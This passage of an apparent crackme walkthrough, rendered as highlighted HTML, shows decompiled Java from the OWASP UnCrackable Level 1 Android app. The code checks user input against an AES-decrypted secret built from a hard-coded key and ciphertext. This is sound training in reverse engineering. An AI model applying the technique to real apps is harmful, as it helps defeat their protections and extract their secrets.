style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">obj\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">            create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setTitle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Success!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            str \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">This is the correct secret.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        } \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">            create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setTitle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Nope...\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            str \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">That's not it. Try again.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setMessage\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setButton\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">OK\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> DialogInterface\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">OnClickListener\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> { \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> from class: sg.vantagepoint.uncrackable1.MainActivity.2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            @\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">Override\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> android.content.DialogInterface.OnClickListener\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            public\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> onClick\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">DialogInterface\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> dialogInterface\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> int\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> i\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">                dialogInterface\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">dismiss\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">show\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So what we can analyze is that this is the basic functionality of the android application. It sets up all the frontend and actions in the application. Let’s try to see how we can get into the \u003Ccode>\"Success!\"\u003C/code> path.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"java\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> obj\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> ((EditText) \u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">findViewById\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">R\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">id\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">edit_text\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getText\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">toString\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">obj\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">            create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setTitle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Success!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            str \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">This is the correct secret.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>It seems that an \u003Ccode>a\u003C/code> object and \u003Ccode>a\u003C/code> method is called with the parameter that is our input. Let’s try to find this \u003Ccode>a\u003C/code> object.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"java\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> class\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#FFCB8B\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> static\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> boolean\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">bArr\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">bArr2\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        try\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            bArr \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> sg\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">vantagepoint\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">b\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">8d127684cbc37c17616d806cf50473cc\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> Base64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">decode\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        } \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">catch\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">Exception\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> e\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">            Log\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">d\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">CodeCheck\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">AES error:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> e\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getMessage\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">())\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            bArr \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> bArr2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">equals\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> String\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">bArr\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> static\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">b\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        int\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> length\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">length\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">bArr\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[length \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">/\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> i\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">; i \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">&#x3C;\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> length; i 